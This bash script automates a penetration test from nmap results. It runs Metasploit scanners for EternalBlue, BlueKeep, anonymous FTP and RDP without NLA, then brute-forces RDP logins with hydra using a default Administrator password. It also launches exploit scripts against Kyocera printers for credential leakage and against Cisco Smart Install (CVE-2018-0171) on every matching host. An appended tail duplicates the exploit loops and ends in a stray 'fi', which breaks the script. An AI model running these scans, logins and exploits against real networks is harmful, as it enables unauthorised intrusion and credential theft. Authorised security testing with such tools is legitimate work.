#!/bin/bash

# Function to display usage information
usage() {
    echo "Usage: $0 <nmap_output_file> --check <all|ports|eternalblue|anonymous|bluekeep|rdp|defaultcreds|httpmethods|kyocera|sslscan|cisco>"
    echo "Examples:"
    echo "  $0 nmap_output.txt --check all        # Run all checks"
    echo "  $0 nmap_output.txt --check eternalblue # Run only Eternal Blue check"
    exit 1
}

function check_exit {
    if [ $? -ne 0 ]; then
        echo "Error: $1"
        exit 1
    fi
}

# Check if no arguments are supplied
if [ $# -lt 1 ]; then
    usage
fi

# Default value for check parameter
check="none"

# Parse arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --check) check="$2"; shift ;;
        *) nmap_file="$1" ;;
    esac
    shift
done

# Ensure nmap file is provided
if [ -z "$nmap_file" ]; then
    usage
fi

if [ "$check" = "all" ] || [ "$check" = "ports" ]; then
    for port in 21 22 23 53 80 139 161 443 3306 3389 2049 6379 1433 1521 445 8080 9091 4786; do
        grep "Host:" "$nmap_file" | grep "$port" | cut -d ' ' -f 2 > "port_$port.txt"
    done
fi

if [ "$check" = "all" ] || [ "$check" = "eternalblue" ]; then
    echo "Eternal Blue Check Started"
    msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010;set threads 200;set rhost file://port_445.txt;run;exit;" | grep "Host is likely VULNERABLE to MS17-010! " | cut -d ' ' -f 2 | tee eternal_blue
    check_exit "Eternal Blue Check failed"
    echo "Eternal Blue Complete"
fi

if [ "$check" = "all" ] || [ "$check" = "anonymous" ]; then
    echo "Anonymous Login Check Started"
    msfconsole -q -x "use auxiliary/scanner/ftp/anonymous;set threads 200;set rhost file://port_21.txt;run;exit;" | grep "Anonymous READ" | cut -d ' ' -f 2 | tee anonymous_login
    check_exit "Anonymous Login Check failed"
    echo "Anonymous Login Check Completed"
fi

if [ "$check" = "all" ] || [ "$check" = "bluekeep" ]; then
    echo "Blue Keep Check Started"
    msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;set threads 200;set rhost file://port_3389.txt;run;exit;" | grep "The target is vulnerable" | cut -d ' ' -f 2 | tee blue_keep
    check_exit "Blue Keep Check failed"
    echo "Blue Keep Check Completed"
fi

if [ "$check" = "all" ] || [ "$check" = "rdp" ]; then
    echo "RDP NLA Check Started"
    msfconsole -q -x "use auxiliary/scanner/rdp/rdp_scanner;set threads 200;set rhost file://port_3389.txt;run;exit;" | grep -a "Requires NLA: No" | cut -d ' ' -f 2 | cut -d ':' -f 1 | tee nla
    check_exit "RDP NLA Check failed"
    echo "RDP NLA Check Completed"
fi

if [ "$check" = "all" ] || [ "$check" = "defaultcreds" ]; then
    echo "Checking Default Credentials"
    hydra -l Administrator -p 'P@ssw0rd' -M nla rdp -o rdp_default_credentials.txt -V
    check_exit "Default credentials check failed"
fi

if [ "$check" = "all" ] || [ "$check" = "httpmethods" ]; then
    echo "HTTP Methods Check Started"
    msfconsole -q -x "use auxiliary/scanner/http/options;set threads 200;set rhost file://port_80.txt;run;exit;" | grep "allow" | cut -d ' ' -f 2 | tee http_methods
    check_exit "HTTP Methods Check failed"

    echo "HTTPS Methods Check Started"
    msfconsole -q -x "use auxiliary/scanner/http/options;set threads 200;set rport 443;set rhost file://port_443.txt;run;exit;" | grep "allow" | cut -d ' ' -f 2 | tee https_methods
    check_exit "HTTPS Methods Check failed"
fi

if [ "$check" = "all" ] || [ "$check" = "kyocera" ]; then
    echo "Kyocera Credential Leakage Check Started"
    for addr in $(cat port_9091.txt); do
        python3 ./kyocera_printer_exploit.py "$addr" | tee "$addr" &
    done
fi

if [ "$check" = "all" ] || [ "$check" = "sslscan" ]; then
    echo "SSL Scan Started"
    sslscan --ssl2 --ssl3 --tls1 --tls11 --targets=port_443.txt > port_443_ssl_report.txt
    grep Connected port_443_ssl_report.txt | cut -d ' ' -f 3 | tee sort_ssl_ips
    check_exit "SSL Scan failed"
fi

if [ "$check" = "all" ] || [ "$check" = "cisco" ]; then
    echo "Cisco Smart Install Check Started"
    for addr in $(cat port_4786.txt); do
        python3 ./cisco_small_intall_CVE-2018-0171.py "$addr" | tee "$addr" &
    done
fi

echo "Script execution completed."


########################################################################################################################################################################################################################################################################################################################

#########################################################################################################################################################################################################################################################################################################################

#Kyocera CREDENTIAL LEAKAGE
for addr in $(cat port_9091.txt);do python3 /root/Documents/kyocera_exploit.py $addr | tee $addr &done

#########################################################################################################################################
echo "---------------cisco_smart_install_test------------------------------- "
echo "------------------------------------------------------------"


chmod 755 cisco_small_intall_CVE-2018-0171.py

for addr in $(cat port_4786.txt);do python3 /root/Documents/smart_install_exploit.py $addr | tee $addr &done

fi

